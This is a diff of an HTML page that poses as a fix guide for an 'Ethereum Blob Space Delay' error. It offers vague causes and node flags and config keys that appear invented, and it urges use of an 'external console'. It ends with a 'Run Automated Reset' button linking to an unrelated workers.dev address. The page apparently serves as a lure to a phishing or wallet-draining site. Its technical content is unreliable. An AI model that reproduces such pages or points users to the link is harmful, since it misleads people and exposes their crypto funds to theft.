@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: BlinkMacSystemFont;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -45,36 +45,30 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to excessive blob data being stored on the Ethereum blockchain, causing a delay in processing new transactions. This happens when the network is congested and the gas prices are high, leading to a backlog of unprocessed transactions.</li>
+<li>The error occurs due to excessive blob data being stored on the Ethereum network, leading to slower transaction processing times and increased gas costs.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas price to prioritize the transaction: <code>eth_sendTransaction({from: '0x...', to: '0x...', value: '0x...', gas: '0x...', gasPrice: '0x...'})</code></li>
-<li>Use a different transaction routing mechanism to bypass congested nodes</li>
-<li>Implement a retry mechanism with exponential backoff to handle temporary delays</li>
+<li>Increase the <code>--blobstore.capacity</code> configuration option to allocate more space for blob storage.</li>
+<li>Run a node with the <code>--clear.blobstore</code> flag to clear existing blob data and free up space.</li>
+<li>Configure the <code>eth.blobstore</code> settings in the node configuration file, as shown in the following code block:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x55241586d50469745864804697458648046974&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x186a0&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x5208&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x186a0&quot;</span>
+<span class="w">  </span><span class="nt">&quot;eth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;blobstore&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;capacity&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1073741824</span>
 <span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing a separate console interface for more complex troubleshooting scenarios. </p>
+<p>Consider utilizing an external console for more advanced configuration and troubleshooting options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ethereum node synchronization</li>
-<li>Web3 provider configuration</li>
-<li>Sufficient ETH balance for transaction fees</li>
+<li>Ethereum node software installed and configured</li>
+<li>Basic understanding of Ethereum network architecture</li>
+<li>Administrative access to the node configuration files</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
